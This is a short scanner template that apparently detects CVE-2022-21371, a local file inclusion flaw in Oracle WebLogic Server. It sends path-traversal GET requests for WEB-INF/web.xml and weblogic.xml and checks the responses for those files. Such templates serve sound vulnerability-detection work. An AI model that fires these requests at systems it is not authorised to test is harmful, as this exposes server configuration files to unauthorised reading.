id: CVE-2022-21371

info:
  name: Oracle WebLogic Server Local File Inclusion
  author: paradessia,narluin
  severity: high
  reference:
    - https://www.oracle.com/security-alerts/cpujan2022.html
    - https://nvd.nist.gov/vuln/detail/CVE-2022-21371
    - https://gist.github.com/picar0jsu/f3e32939153e4ced263d3d0c79bd8786

rules:
   r0:
    request:
      method: GET
      path: ".//WEB-INF/web.xml"
    expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>') && (response.headers.contenttype.icontains('application/xml') || response.headers.contenttype.icontains('text/xml'))
   r1:
     request:
       method: GET
       path: ".//WEB-INF/weblogic.xml"
     expression: response.status == 200 && response.body.bcontains(b'<weblogic-web-app') && response.body.bcontains(b'</weblogic-web-app>') && (response.headers.contenttype.icontains('application/xml') || response.headers.contenttype.icontains('text/xml'))
expression: r0() || r1()